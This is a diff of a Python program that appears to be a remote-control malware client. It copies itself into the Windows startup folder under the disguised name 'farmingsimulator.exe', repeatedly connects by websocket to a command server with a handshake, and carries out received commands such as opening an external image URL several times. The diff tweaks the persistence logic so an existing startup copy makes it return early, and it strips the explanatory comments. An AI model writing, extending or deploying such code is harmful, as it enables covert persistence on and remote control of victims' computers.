@@ -58,11 +58,7 @@ def check_reinstall():
 def move_to_startup():
     for f in os.listdir(startup_folder):
         if f.startswith("farmingsimulator") and f.endswith(".exe"):
-            try:
-                os.remove(os.path.join(startup_folder, f))
-                print(f"Old file {f} removed.")
-            except Exception as e:
-                print(f"Error removing {f}: {e}")
+            return
 
     dest_name = f"farmingsimulator.exe"
     dest = os.path.join(startup_folder, dest_name)
@@ -143,7 +139,6 @@ async def receiver(ws):
                 for c in range(4):
                     os.startfile("https://res.cloudinary.com/dnkpzafxp/image/upload/v1767213665/image_jtpkzq.png")
     except Exception:
-        # connection closed or other error, exit to allow reconnect
         pass
 
 
@@ -153,12 +148,10 @@ async def main():
 
     while True:
         try:
-            # only attempt to connect if there is no active open connection
             if ws is None or getattr(ws, "closed", True):
                 ws = await websockets.connect(SERVER_URL)
                 print("Connected")
 
-                # send hello/handshake
                 await ws.send(f"HELLO_{CLIENT_NAME}")
                 response = await ws.recv()
                 print("Received:", response)
@@ -172,18 +165,14 @@ async def main():
                     await asyncio.sleep(5)
                     continue
 
-                # start receiver and pinger tasks
                 receiver_task = asyncio.create_task(receiver(ws))
                 pinger_task = asyncio.create_task(pinger(ws))
 
-                # wait until one of the tasks finishes (likely receiver on disconnect)
                 done, pending = await asyncio.wait([receiver_task, pinger_task], return_when=asyncio.FIRST_EXCEPTION)
 
-                # cancel any pending tasks
                 for t in pending:
                     t.cancel()
 
-                # close socket and clear
                 try:
                     await ws.close()
                 except Exception:
